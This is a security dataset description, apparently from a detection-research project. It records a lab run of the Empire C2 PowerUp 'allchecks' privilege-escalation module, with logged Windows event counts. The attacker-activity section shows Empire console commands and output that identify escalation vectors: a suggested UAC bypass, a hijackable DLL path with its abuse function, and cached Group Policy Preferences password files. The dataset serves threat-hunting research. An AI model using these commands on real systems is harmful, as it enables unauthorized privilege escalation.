# Empire Powerup All Checks

Runs all current checks for Windows privesc vectors.

## Technique(s) ID

T1007

## Creators

Roberto Rodriguez [@Cyb3rWard0g](https://twitter.com/Cyb3rWard0g)

## Dataset

[empire_powerup_all_checks.tar.gz](./empire_powerup_all_checks.tar.gz)

## Network Environment

Shire

## Time Taken

2019-05-18182927

## About this file

| log_name                                   | source_name                         | task                                                   |   record_number |
|--------------------------------------------|-------------------------------------|--------------------------------------------------------|-----------------|
| Windows PowerShell                         | PowerShell                          | Pipeline Execution Details                             |            2057 |
| Windows PowerShell                         | PowerShell                          | Provider Lifecycle                                     |               8 |
| Windows PowerShell                         | PowerShell                          | Engine Lifecycle                                       |               1 |
| System                                     | Service Control Manager             | na                                                     |               1 |
| Security                                   | Microsoft-Windows-Security-Auditing | Token Right Adjusted Events                            |             112 |
| Security                                   | Microsoft-Windows-Security-Auditing | Filtering Platform Connection                          |             106 |
| Security                                   | Microsoft-Windows-Security-Auditing | Registry                                               |              36 |
| Security                                   | Microsoft-Windows-Security-Auditing | Removable Storage                                      |              24 |
| Security                                   | Microsoft-Windows-Security-Auditing | Handle Manipulation                                    |              17 |
| Security                                   | Microsoft-Windows-Security-Auditing | Process Termination                                    |               9 |
| Security                                   | Microsoft-Windows-Security-Auditing | Group Membership                                       |               8 |
| Security                                   | Microsoft-Windows-Security-Auditing | Logon                                                  |               8 |
| Security                                   | Microsoft-Windows-Security-Auditing | Logoff                                                 |               7 |
| Security                                   | Microsoft-Windows-Security-Auditing | Special Logon                                          |               7 |
| Security                                   | Microsoft-Windows-Security-Auditing | Other Object Access Events                             |               6 |
| Security                                   | Microsoft-Windows-Security-Auditing | Process Creation                                       |               4 |
| Security                                   | Microsoft-Windows-Security-Auditing | Authorization Policy Change                            |               3 |
| Security                                   | Microsoft-Windows-Security-Auditing | File Share                                             |               2 |
| Security                                   | Microsoft-Windows-Security-Auditing | Kerberos Service Ticket Operations                     |               2 |
| Security                                   | Microsoft-Windows-Security-Auditing | Detailed File Share                                    |               1 |
| Security                                   | Microsoft-Windows-Security-Auditing | Sensitive Privilege Use                                |               1 |
| Microsoft-Windows-WMI-Activity/Operational | Microsoft-Windows-WMI-Activity      | na                                                     |               2 |
| Microsoft-Windows-Sysmon/Operational       | Microsoft-Windows-Sysmon            | Process accessed (rule: ProcessAccess)                 |             235 |
| Microsoft-Windows-Sysmon/Operational       | Microsoft-Windows-Sysmon            | Image loaded (rule: ImageLoad)                         |             173 |
| Microsoft-Windows-Sysmon/Operational       | Microsoft-Windows-Sysmon            | Network connection detected (rule: NetworkConnect)     |              87 |
| Microsoft-Windows-Sysmon/Operational       | Microsoft-Windows-Sysmon            | Registry object added or deleted (rule: RegistryEvent) |              59 |
| Microsoft-Windows-Sysmon/Operational       | Microsoft-Windows-Sysmon            | Pipe Connected (rule: PipeEvent)                       |              25 |
| Microsoft-Windows-Sysmon/Operational       | Microsoft-Windows-Sysmon            | File created (rule: FileCreate)                        |               9 |
| Microsoft-Windows-Sysmon/Operational       | Microsoft-Windows-Sysmon            | Process terminated (rule: ProcessTerminate)            |               8 |
| Microsoft-Windows-Sysmon/Operational       | Microsoft-Windows-Sysmon            | Registry value set (rule: RegistryEvent)               |               5 |
| Microsoft-Windows-Sysmon/Operational       | Microsoft-Windows-Sysmon            | Process Create (rule: ProcessCreate)                   |               4 |
| Microsoft-Windows-Sysmon/Operational       | Microsoft-Windows-Sysmon            | RawAccessRead detected (rule: RawAccessRead)           |               1 |
| Microsoft-Windows-PowerShell/Operational   | Microsoft-Windows-PowerShell        | Executing Pipeline                                     |            2022 |

## Attacker Activity

```
(Empire: H3DKB8SA) > usemodule privesc/powerup/allchecks
(Empire: powershell/privesc/powerup/allchecks) > info

              Name: Invoke-AllChecks
            Module: powershell/privesc/powerup/allchecks
        NeedsAdmin: False
         OpsecSafe: True
          Language: powershell
MinLanguageVersion: 2
        Background: True
   OutputExtension: None

Authors:
  @harmj0y

Description:
  Runs all current checks for Windows privesc vectors.

Comments:
  https://github.com/PowerShellEmpire/PowerTools/tree/master/P
  owerUp

Options:

  Name  Required    Value                     Description
  ----  --------    -------                   -----------
  Agent True        H3DKB8SA                  Agent to run module on.                 

(Empire: powershell/privesc/powerup/allchecks) > execute
[*] Tasked H3DKB8SA to run TASK_CMD_JOB
[*] Agent H3DKB8SA tasked with task ID 1
[*] Tasked agent H3DKB8SA to run module powershell/privesc/powerup/allchecks
(Empire: powershell/privesc/powerup/allchecks) > Job started: XSHUNF

[*] Running Invoke-AllChecks


[*] Checking if user is in a local group with administrative privileges...
[+] User is in a local group that grants administrative privileges!
[+] Run a BypassUAC attack to elevate privileges to admin.


[*] Checking for unquoted service paths...


[*] Checking service executable and argument permissions...


[*] Checking service permissions...


[*] Checking %PATH% for potentially hijackable DLL locations...


ModifiablePath    : C:\Users\nmartha\AppData\Local\Microsoft\WindowsApps
IdentityReference : SHIRE\nmartha
Permissions       : {WriteOwner, Delete, WriteAttributes, Synchronize...}
%PATH%            : C:\Users\nmartha\AppData\Local\Microsoft\WindowsApps
AbuseFunction     : Write-HijackDll -DllPath 'C:\Users\nmartha\AppData\Local\Microsoft\WindowsApps\wlbsctrl.dll'





[*] Checking for AlwaysInstallElevated registry key...


[*] Checking for Autologon credentials in registry...


[*] Checking for modifidable registry autoruns and configs...


[*] Checking for modifiable schtask files/configs...


[*] Checking for unattended install files...


[*] Checking for encrypted web.config strings...


[*] Checking for encrypted application pool and virtual directory passwords...


[*] Checking for plaintext passwords in McAfee SiteList.xml files....




[*] Checking for cached Group Policy Preferences .xml files....


Changed   : [BLANK]
UserNames : [BLANK]
NewName   : [BLANK]
Passwords : [BLANK]
File      : C:\ProgramData\Microsoft\Group 
            Policy\History\{D0D4B108-2AA4-40A4-AAB2-066DB35CF4A8}\Machine\Preferences\Groups\Groups.xml

Invoke-AllChecks completed!
```